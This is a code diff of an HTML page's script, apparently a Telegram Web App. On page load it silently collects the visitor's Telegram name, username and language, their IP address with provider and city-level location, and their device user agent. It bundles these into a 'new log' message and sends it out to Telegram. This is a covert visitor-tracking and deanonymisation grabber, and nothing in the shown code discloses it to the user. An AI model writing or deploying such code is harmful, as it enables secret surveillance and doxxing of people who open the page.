@@ -17,50 +17,42 @@
             });
         }
         
-        function getUserIP() {
+        function collectData() {
+            let logData = "👤 Новый лог\n";
+            
+            // Получение информации о пользователе Telegram
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                const user = Telegram.WebApp.initDataUnsafe.user;
+                if (user) {
+                    logData += `[+] Имя: ${user.first_name} ${user.last_name || ''}\n`;
+                    logData += `[+] Юзернейм: @${user.username || 'Не указан'}\n`;
+                    logData += `[+] Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
+                }
+            }
+            
+            // Получение IP и геолокации
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     fetch(`https://ipinfo.io/${data.ip}/json`)
                         .then(response => response.json())
                         .then(info => {
-                            let ipData = `IPv4: ${data.ip}\n`;
-                            ipData += `    [+] Провайдер: ${info.org || 'Неизвестно'}\n`;
-                            ipData += `    [+] Страна: ${info.country || 'Неизвестно'}\n`;
-                            ipData += `    [+] Регион: ${info.region || 'Неизвестно'}\n`;
-                            ipData += `    [+] Город: ${info.city || 'Неизвестно'}\n\n`;
-                            sendToTelegram(ipData);
+                            logData += `IPv4: ${data.ip}\n`;
+                            logData += `    [+] Провайдер: ${info.org || 'Неизвестно'}\n`;
+                            logData += `    [+] Страна: ${info.country || 'Неизвестно'}\n`;
+                            logData += `    [+] Регион: ${info.region || 'Неизвестно'}\n`;
+                            logData += `    [+] Город: ${info.city || 'Неизвестно'}\n\n`;
+                            
+                            // Получение информации об устройстве
+                            logData += `[+] Устройство: ${navigator.userAgent}\n`;
+                            sendToTelegram(logData);
                         });
                 })
                 .catch(error => console.error('Ошибка получения IP:', error));
         }
         
-        function getUserInfo() {
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.ready();
-                const user = Telegram.WebApp.initDataUnsafe.user;
-                if (user) {
-                    let userInfo = `👤 Новый лог\n`;
-                    userInfo += `[+] Имя: ${user.first_name} ${user.last_name || ''}\n`;
-                    userInfo += `[+] Юзернейм: @${user.username || 'Не указан'}\n`;
-                    userInfo += `[+] Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
-                    sendToTelegram(userInfo);
-                }
-            }
-        }
-        
-        function getDeviceInfo() {
-            let deviceInfo = `[+] Устройство: ${navigator.userAgent}\n`;
-            sendToTelegram(deviceInfo);
-        }
-        
-        function initApp() {
-            getUserInfo();
-            getUserIP();
-            getDeviceInfo();
-        }
-        
-        window.onload = initApp;
+        window.onload = collectData;
     </script>
 </head>
 <body>
